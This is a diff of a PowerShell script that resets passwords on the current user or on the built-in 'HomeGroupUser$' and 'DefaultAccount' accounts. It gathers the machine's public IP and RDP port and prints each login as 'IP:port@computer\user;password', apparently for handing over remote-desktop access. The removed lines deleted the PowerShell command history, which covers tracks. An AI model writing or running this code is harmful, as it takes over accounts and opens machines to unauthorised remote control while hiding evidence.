@@ -1,16 +1,17 @@
-Clear-Host
-Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 $confirm = Read-Host "[*] only for current user?"
 $onlyCurrentUser = $confirm -in @('Y', 'Yes', 'yes', 'YES', 'y')
+
 function Generate-Password {
     $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
     -join ((1..64) | ForEach-Object { $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)] })
 }
+
 try {
     $rdpPort = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name PortNumber | Select-Object -ExpandProperty PortNumber
 } catch {
     $rdpPort = 3389
 }
+
 $computers = $env:COMPUTERNAME
 $domain = $env:USERDOMAIN
 try {
@@ -18,20 +19,23 @@ try {
 } catch {
     $publicIp = "unknown"
 }
+
 $results = @()
+
 if ($onlyCurrentUser) {
     $user = $env:USERNAME
     $password = Generate-Password
     net user $user $password
-    $results += "$publicIp:$rdpPort@$computers\$user;$password"
+    $results += "${publicIp}:${rdpPort}@${computers}\$user;$password"
 } else {
     $accounts = @('HomeGroupUser$', 'DefaultAccount')
     foreach ($acc in $accounts) {
         $password = Generate-Password
         net user $acc $password
-        $results += "$publicIp:$rdpPort@$computers\$acc;$password"
+        $results += "${publicIp}:${rdpPort}@${computers}\$acc;$password"
     }
 }
+
 Write-Output "# computer: $computers/$domain"
 Write-Output ""
 Write-Output "# all internet adapters"
